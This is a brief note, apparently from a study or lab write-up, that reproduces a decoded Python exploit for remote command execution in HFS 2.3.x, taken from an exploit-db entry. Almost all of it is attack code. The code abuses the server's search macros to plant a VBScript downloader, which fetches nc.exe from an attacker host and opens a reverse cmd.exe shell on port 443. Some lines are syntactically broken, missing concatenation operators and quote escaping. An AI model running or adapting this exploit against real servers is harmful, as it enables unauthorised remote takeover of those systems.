# HFS 2.3.x remote command execution 

<https://www.exploit-db.com/exploits/39161>

after decode the whole exploit, we can see

~~~~python
#!/usr/bin/python
...
import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://" sys.argv[1] ":" sys.argv[2] "/?search={. " save ".}")

	def execute_script():
		urllib2.urlopen("http://" sys.argv[1] ":" sys.argv[2] "/?search={. " exe ".}")

	def nc_run():
		urllib2.urlopen("http://" sys.argv[1] ":" sys.argv[2] "/?search={. " exe1 ".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	
    vbs = "C:\Users\Public\script.vbs|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://" ip_addr "/nc.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\nc.exe", 2 '//overwrite
end with"

	save= "save|"   vbs
	vbs2 = "cscript.exe C:\Users\Public\script.vbs"
	exe= "exec|" vbs2
	vbs3 = "C:\Users\Public\nc.exe -e cmd.exe " ip_addr " " local_port
	exe1= "exec|" vbs3
    
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
~~~~



